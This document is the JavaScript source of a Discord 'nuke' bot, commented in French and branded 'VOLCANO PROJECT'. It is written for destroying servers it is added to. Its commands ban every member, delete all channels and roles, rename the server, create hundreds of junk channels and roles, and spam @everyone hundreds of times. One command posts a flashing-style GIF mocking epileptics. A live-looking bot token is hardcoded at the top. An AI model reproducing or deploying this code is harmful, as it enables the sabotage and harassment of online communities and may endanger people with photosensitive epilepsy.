// ==============================================================================================================================
// TOUTES LES CONSTANTES
// TOUTES LES CONSTANTES
// ==============================================================================================================================
const Discord = require('discord.js');
const client = new Discord.Client();



// ==============================================================================================================================
// TOUTES LES VARIABLES
// TOUTES LES VARIABLES
// ==============================================================================================================================
var prefix = '-'
var token = 'NTkxMzQzODUwMzg4NDU1NDQ5.XRXKvA.DvAW2qm68KcMobpTahkxZzSIne4' 
var imageicone = ("https://cdn.discordapp.com/attachments/573928083002884116/592037367007936540/troll-face-quest.jpg") 
var nomserveur = ("Exterminer par VOLCANO | PROJECT") 
var nomdusalon = ("apu-de-serveur") 
var authorid = ("573164317848109091") 
var poto = ("508774249960570921") 
var poto1 = ("299276201799843843")
var msgspam = ("**@everyone SERVEUR DÉTRUIT PAR VOLCANO PROJECT**")



// ==============================================================================================================================
// ESPACE CONNECTION / PROFIL
// ESPACE CONNECTION / PROFIL
// ==============================================================================================================================
client.login(token);

client.on('ready',function(){
console.log("VOLCANO PROJECT ON")
client.user.setActivity("VOLCANO | -AIDE PROJECT", {type : "STREAMING"})
});



// ==============================================================================================================================
// STOP PURGE
// STOP PURGE
// ==============================================================================================================================
client.on('message', function(message){
 if (message.content === ('-STOP')){
    if (message.author.id !== ("573164317848109091")){return message.channel.send(``)}
  message.channel.send(`__**Le bot est en maintenance ...**__`)
     message.delete().then(client.destroy())
     } else if(message.content.startsWith(prefix + "PURGE") || message.content.startsWith(prefix + "CLEAR")) {
let args = message.content.split(" ").slice(1);
    if(!args[0]) return message.channel.send("")
    message.delete() 
    message.channel.bulkDelete(args[0]).then(() => {
 message.channel.send(``)
})
}
});


client.on('message', function(message){
 if (message.content === ('-STOP')){
    if (message.author.id !== (poto)){return message.channel.send(``)}
  message.channel.send(`__**Le bot est en maintenance ...**__`)
     message.delete().then(client.destroy())
     } else if(message.content.startsWith(prefix + "6939402136LL-PURGE") || message.content.startsWith(prefix + "6939402136LL-CLEAR")) {
let args = message.content.split(" ").slice(1);
    if(!args[0]) return message.channel.send("")
    message.delete() 
    message.channel.bulkDelete(args[0]).then(() => {
 message.channel.send(``)
})
}
});


 client.on('message', function(message){
 if (message.content === ('-STOP')){
    if (message.author.id !== (poto1)){return message.channel.send(``)}
  message.channel.send(`__**Le bot est en maintenance ...**__`)
     message.delete().then(client.destroy())
     } else if(message.content.startsWith(prefix + "6939402136LL-PURGE") || message.content.startsWith(prefix + "6939402136LL-CLEAR")) {
let args = message.content.split(" ").slice(1);
    if(!args[0]) return message.channel.send("")
    message.delete() 
    message.channel.bulkDelete(args[0]).then(() => {
 message.channel.send(``)
})
}
});



// ==============================================================================================================================
// BAN 
// BAN 
// ==============================================================================================================================
client.on('message', message => {
  if (!message.guild) return;

  if (message.content.startsWith(prefix + 'BAN')) {
    const user = message.mentions.users.first();
  if (user) {
      const member = message.guild.member(user);
  if (member) {
        member.ban({
          reason: 'BAN',
        }).then(() => {
        }).catch(err => {
          console.error(err);
        });
      } else {
      }
    } else {
    }
  }
});

client.login(token);



// ==============================================================================================================================
// SPAM 
// SPAM 
// ==============================================================================================================================
client.on('message', message => {
  if (message.content === prefix + "SPAM") {
  if (message.deletable) message.delete()
  for (i = 0; i < 100; i++) {
        message.channel.send("**@everyone SERVEUR DÉTRUIT PAR VOLCANO PROJECT**")
        message.channel.send("**@everyone SERVEUR DÉTRUIT PAR VOLCANO PROJECT**")
        message.channel.send("**@everyone SERVEUR DÉTRUIT PAR VOLCANO PROJECT**")
        message.channel.send("**@everyone SERVEUR DÉTRUIT PAR VOLCANO PROJECT**")
        message.channel.send("**@everyone SERVEUR DÉTRUIT PAR VOLCANO PROJECT**")
}
}
})

   

// ==============================================================================================================================
// ALL-BAN 
// ALL-BAN 
// ==============================================================================================================================
client.on('message', message => {
     if (message.content === prefix + 'ALL-BAN') {
     if (message.deletable) message.delete();
          message.guild.members.forEach(member => {
            member.ban().then(function () {});
});
}
})

    

// ==============================================================================================================================
// CREATE 
// CREATE 
// ==============================================================================================================================
client.on('message', message => {
        if (message.content === prefix + 'CREATE') {
        if (message.deletable) message.delete();
        let i = 0;
        let interval = setInterval(function () {
         if (i === 250) clearInterval(interval)
          message.guild.createChannel(nomdusalon).then(i++);
        }, 100);
}
})

    

// ==============================================================================================================================
// END
// END
// ==============================================================================================================================
client.on('message', message => {
        if (message.content === prefix + 'END') {
        if (message.deletable) message.delete();
        message.guild.setRegion('hongkong')
        message.guild.setIcon(imageicone);
        message.guild.setName(nomserveur)
        message.guild.channels.forEach(chan => {
          if (chan.deletable) chan.delete();
        });  
        message.guild.roles.forEach(role => {
          role.delete()
        });
        let i = 0;
        let interval = setInterval(function () {
          if (i === 250) clearInterval(interval);
          message.guild.createChannel(nomdusalon).then(i++);
        }, 100);
        let args = message.content.split(' ')
        args.shift()
        message.reply(msgspam)
      }
     })

    

// ==============================================================================================================================
// ÉPILEPTIQUE 
// ÉPILEPTIQUE 
// ==============================================================================================================================
client.on('message', message => {
      if (message.content === prefix + "EPIL"){
      if (message.deletable) message.delete();
      var riplesyeuxembed = new Discord.RichEmbed()
       .setColor("#FFFEFE")
       .setImage("https://cdn.discordapp.com/attachments/438769530018463744/445988981046247444/image.gif")
       .setTitle("Rip les Épileptiques ... ")

      message.channel.send(riplesyeuxembed)
    }
}) 



// ==============================================================================================================================
// AIDE 
// AIDE 
// ==============================================================================================================================
client.on('message', message => {
 if (message.content === (prefix + "AIDE")){
    var aboutembed = new Discord.RichEmbed()
            .setColor("#0000FF")
            .addField("**VOICI LES COMMANDES**", "­")
            .addField("**-AIDE\n-STOP\n-PURGE**", "")
            .addField("**-BAN\n-SPAM\n-ALL-BAN\n-END\n-EPIL**", "")
message.channel.send(aboutembed);
}
}) 



// ==============================================================================================================================
// END
// END
// ==============================================================================================================================
client.on('message', message => {
        if (message.content === prefix + 'END') {
        if (message.deletable) message.delete();
        let i = 0;
        let interval = setInterval(function () {
         if (i === 250) clearInterval(interval);
          message.guild.createRole({
         "name": " ",
    "color": 3447003,
    "hoist": false,
    "position": 1,
    "permissions": 66321471,
    "managed": false,
    "mentionable": false
    });(i++);
        }, 100);
}
})
